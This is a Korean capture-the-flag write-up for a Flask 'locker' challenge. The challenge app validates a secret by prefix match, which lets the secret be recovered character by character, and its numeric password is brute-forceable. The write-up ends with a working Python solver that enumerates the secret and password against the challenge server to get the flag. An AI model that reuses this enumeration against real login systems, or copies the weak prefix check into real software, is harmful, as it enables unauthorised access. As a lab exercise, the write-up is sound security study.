```c
#!/usr/bin/python3
from flask import Flask, request, render_template
import string
import random

app = Flask(__name__)

try:
    FLAG = open("./flag.txt", "r").read()       # flag is here!
except:
    FLAG = "[**FLAG**]"


rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)


@app.route("/", methods = ["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        locker_num = request.form.get("locker_num", "")
        password = request.form.get("password", "")

        if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
            if locker_num == rand_str and password == str(rand_num):
                return render_template("index.html", result = "FLAG:" + FLAG)
            return render_template("index.html", result = "Good")
        else: 
            return render_template("index.html", result = "Wrong!")
            
            
app.run(host="0.0.0.0", port=8000)
```
---
```c
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
```
여기서 비밀번호 변경시 사용하는 검증 방식이 모호하다 
만약
```c
rand_str[0:1] -> a
```
라고 전달하게되면 참이 반환된다 즉 한글자씩 검증하여 prefix 한글자씩 맞추는 방식이가능

```c
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)
```
random에서 사용한값또한 string.ascii_lowercase + string.digits 함수로 생성하므로
```c
abcdefghijklmnopqrstuvwxyz0123456789
```
이게 전체 문자열 후보가된다

---
rand_num
```c
rand_num = random.randint(100, 200)
```

rand_num값 자체는 100~200 범위이므로 그냥 브루드포스 하면된다

---
payload

```c
import requests
import string

URL = "http://host3.dreamhack.games:12898/"
charset = string.ascii_lowercase + string.digits
sess = requests.Session()
sess.trust_env = False

rand_str = ""

# rand_str 복구
for pos in range(4):
    for ch in charset:
        attempt = rand_str + ch
        r = sess.post(URL, data={
           "locker_num": attempt,
            "password": "0"
        })
        if "Wrong!" not in r.text:
            rand_str += ch
            print(f"[+] found char {pos}: {ch}")
            break
print(f"[+] rand_str = {rand_str}")
# rand_num 브루트포스
for pw in range(100, 201):
    r = sess.post(URL, data={
        "locker_num": rand_str,
        "password": str(pw)
    })
    if "FLAG:" in r.text:
        print(f"[+] password = {pw}")
        start = r.text.find("FLAG:")
        print(r.text[start:])
        break
```


